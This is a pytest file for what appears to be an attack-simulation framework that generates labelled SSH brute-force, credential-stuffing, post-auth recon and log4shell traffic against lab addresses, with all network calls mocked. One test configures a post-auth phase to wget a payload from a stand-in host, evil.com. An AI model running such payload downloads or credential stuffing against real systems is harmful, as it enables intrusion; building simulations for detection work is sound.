"""Tests for attack module registration, profiles, dry_run, and mocked execute."""

from __future__ import annotations

import logging
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from attacks.config import IPSourceConfig, PhaseConfig, TimingConfig, load_campaign
from attacks.modules.base import AttackModuleRegistry
from attacks.modules.credential_stuffing import CredentialStuffingModule
from attacks.modules.ssh_post_auth import COMMAND_PROFILES, SSHPostAuthModule

CAMPAIGNS_DIR = Path(__file__).parent.parent.parent / "campaigns"


# ── Registration ──────────────────────────────────────────────────────


class TestModuleRegistration:
    def test_all_five_modules_registered(self):
        available = AttackModuleRegistry.available()
        assert "recon" in available
        assert "ssh_brute_force" in available
        assert "log4shell" in available
        assert "ssh_post_auth" in available
        assert "credential_stuffing" in available
        assert len(available) == 5

    def test_get_ssh_post_auth(self):
        module = AttackModuleRegistry.get("ssh_post_auth")
        assert isinstance(module, SSHPostAuthModule)
        assert module.name == "ssh_post_auth"

    def test_get_credential_stuffing(self):
        module = AttackModuleRegistry.get("credential_stuffing")
        assert isinstance(module, CredentialStuffingModule)
        assert module.name == "credential_stuffing"


# ── Command Profiles ──────────────────────────────────────────────────


class TestCommandProfiles:
    def test_all_profiles_exist(self):
        assert "system_profiler" in COMMAND_PROFILES
        assert "user_enum" in COMMAND_PROFILES
        assert "net_enum" in COMMAND_PROFILES
        assert "full_recon" in COMMAND_PROFILES

    def test_full_recon_contains_all_others(self):
        full = set(COMMAND_PROFILES["full_recon"])
        for name, cmds in COMMAND_PROFILES.items():
            if name != "full_recon":
                for cmd in cmds:
                    assert cmd in full, f"{cmd!r} from {name} not in full_recon"

    def test_profiles_are_non_empty(self):
        for name, cmds in COMMAND_PROFILES.items():
            assert len(cmds) > 0, f"Profile {name!r} is empty"


# ── Dry Run ───────────────────────────────────────────────────────────


def _make_phase(module: str, **param_overrides) -> PhaseConfig:
    """Helper to create a PhaseConfig for testing."""
    params: dict = {}
    if module == "ssh_post_auth":
        params = {"username": "test", "password": "test", "command_profile": "system_profiler"}
    elif module == "credential_stuffing":
        params = {"credentials": [["user1", "pass1"], ["user2", "pass2"]]}
    params.update(param_overrides)

    return PhaseConfig(
        name="Test Phase",
        module=module,
        mitre_technique="T1059.004" if module == "ssh_post_auth" else "T1110.004",
        mitre_tactic="TA0002" if module == "ssh_post_auth" else "TA0006",
        attack_type="execution" if module == "ssh_post_auth" else "credential_stuffing",
        attack_stage="execution" if module == "ssh_post_auth" else "initial_access",
        severity=3 if module == "ssh_post_auth" else 2,
        params=params,
        ip_source=IPSourceConfig("aliased", 3, "192.168.2.0/24", start_offset=120),
        timing=TimingConfig(duration_seconds=60),
    )


class TestDryRun:
    def test_post_auth_dry_run(self):
        module = AttackModuleRegistry.get("ssh_post_auth")
        phase = _make_phase("ssh_post_auth")
        ips = ["192.168.2.120", "192.168.2.121"]
        result = module.dry_run(phase, ips)
        assert result["module"] == "ssh_post_auth"
        assert result["ip_count"] == 2
        assert result["params"]["command_profile"] == "system_profiler"

    def test_credential_stuffing_dry_run(self):
        module = AttackModuleRegistry.get("credential_stuffing")
        phase = _make_phase("credential_stuffing")
        ips = ["192.168.2.130", "192.168.2.131"]
        result = module.dry_run(phase, ips)
        assert result["module"] == "credential_stuffing"
        assert result["ip_count"] == 2
        assert len(result["params"]["credentials"]) == 2


# ── Mocked Execute ────────────────────────────────────────────────────


class TestSSHPostAuthExecute:
    @patch("attacks.modules.ssh_post_auth.paramiko.SSHClient")
    @patch("attacks.modules.ssh_post_auth.socket.socket")
    def test_execute_runs_commands(self, mock_socket_cls, mock_ssh_cls):
        """Post-auth module connects, runs commands, returns success."""
        # Mock socket
        mock_sock = MagicMock()
        mock_socket_cls.return_value = mock_sock

        # Mock SSH client — exec_command returns (stdin, stdout, stderr)
        mock_client = MagicMock()
        mock_ssh_cls.return_value = mock_client
        mock_stdout = MagicMock()
        mock_stdout.channel.recv_exit_status.return_value = 0
        mock_client.exec_command.return_value = (MagicMock(), mock_stdout, MagicMock())

        module = AttackModuleRegistry.get("ssh_post_auth")
        phase = _make_phase("ssh_post_auth", inter_command_delay_ms=[0, 0])
        phase.timing = TimingConfig(duration_seconds=300)
        ips = ["192.168.2.120"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        result = module.execute("192.168.2.201", phase, ips, rng, logger)

        assert result.module_name == "ssh_post_auth"
        assert result.attempts == 1
        assert result.successes == 1
        assert len(result.metadata["commands_executed"]) == len(COMMAND_PROFILES["system_profiler"])

    @patch("attacks.modules.ssh_post_auth.paramiko.SSHClient")
    @patch("attacks.modules.ssh_post_auth.socket.socket")
    def test_execute_with_download_url(self, mock_socket_cls, mock_ssh_cls):
        """download_url appends wget command to command list."""
        mock_sock = MagicMock()
        mock_socket_cls.return_value = mock_sock

        mock_client = MagicMock()
        mock_ssh_cls.return_value = mock_client
        mock_stdout = MagicMock()
        mock_stdout.channel.recv_exit_status.return_value = 0
        mock_client.exec_command.return_value = (MagicMock(), mock_stdout, MagicMock())

        module = AttackModuleRegistry.get("ssh_post_auth")
        phase = _make_phase(
            "ssh_post_auth",
            command_profile="user_enum",
            download_url="http://evil.com/payload",
            inter_command_delay_ms=[0, 0],
        )
        phase.timing = TimingConfig(duration_seconds=300)
        ips = ["192.168.2.120"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        result = module.execute("192.168.2.201", phase, ips, rng, logger)

        expected_count = len(COMMAND_PROFILES["user_enum"]) + 1  # +1 for wget
        assert len(result.metadata["commands_executed"]) == expected_count
        assert result.metadata["download_url"] == "http://evil.com/payload"

    def test_invalid_profile_raises(self):
        """Unknown command_profile raises ValueError."""
        module = AttackModuleRegistry.get("ssh_post_auth")
        phase = _make_phase("ssh_post_auth", command_profile="nonexistent")
        phase.timing = TimingConfig(duration_seconds=60)
        ips = ["192.168.2.120"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        with pytest.raises(ValueError, match="Unknown command_profile"):
            module.execute("192.168.2.201", phase, ips, rng, logger)


class TestCredentialStuffingExecute:
    @patch("attacks.modules.credential_stuffing.paramiko.SSHClient")
    @patch("attacks.modules.credential_stuffing.socket.socket")
    def test_execute_tries_each_cred_once(self, mock_socket_cls, mock_ssh_cls):
        """Each credential pair is tried exactly once."""
        mock_sock = MagicMock()
        mock_socket_cls.return_value = mock_sock

        mock_client = MagicMock()
        mock_ssh_cls.return_value = mock_client
        # All logins fail (AuthenticationException)
        mock_client.connect.side_effect = __import__("paramiko").AuthenticationException("denied")

        creds = [[f"user{i}", f"pass{i}"] for i in range(10)]
        module = AttackModuleRegistry.get("credential_stuffing")
        phase = _make_phase("credential_stuffing", credentials=creds)
        phase.timing = TimingConfig(duration_seconds=300)
        ips = ["192.168.2.130"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        result = module.execute("192.168.2.201", phase, ips, rng, logger)

        assert result.module_name == "credential_stuffing"
        assert result.attempts == 10
        assert result.successes == 0
        assert result.metadata["unique_usernames"] == 10

    def test_missing_credentials_raises(self):
        """credential_stuffing requires credentials param."""
        module = AttackModuleRegistry.get("credential_stuffing")
        phase = _make_phase("credential_stuffing")
        # Remove credentials from params
        phase.params = {"target_port": 22}
        phase.timing = TimingConfig(duration_seconds=60)
        ips = ["192.168.2.130"]

        import random
        rng = random.Random(42)
        logger = logging.getLogger("test")

        with pytest.raises(ValueError, match="credentials"):
            module.execute("192.168.2.201", phase, ips, rng, logger)


# ── Campaign YAML Loading ─────────────────────────────────────────────


class TestCampaignYAMLLoading:
    def test_load_post_auth_only(self):
        config = load_campaign(CAMPAIGNS_DIR / "post_auth_only.yaml")
        assert len(config.phases) == 1
        assert config.phases[0].module == "ssh_post_auth"
        assert config.phases[0].attack_type == "execution"
        assert config.phases[0].attack_stage == "execution"
        assert config.phases[0].severity == 3

    def test_load_credential_stuffing_only(self):
        config = load_campaign(CAMPAIGNS_DIR / "credential_stuffing_only.yaml")
        assert len(config.phases) == 1
        assert config.phases[0].module == "credential_stuffing"
        assert config.phases[0].attack_type == "credential_stuffing"
        assert config.phases[0].attack_stage == "initial_access"
        assert config.phases[0].severity == 2

    def test_load_full_killchain(self):
        config = load_campaign(CAMPAIGNS_DIR / "full_killchain.yaml")
        assert len(config.phases) == 3
        assert config.phases[0].module == "recon"
        assert config.phases[1].module == "credential_stuffing"
        assert config.phases[2].module == "ssh_post_auth"
        # Verify kill chain progression
        assert config.phases[0].attack_stage == "recon"
        assert config.phases[1].attack_stage == "initial_access"
        assert config.phases[2].attack_stage == "execution"
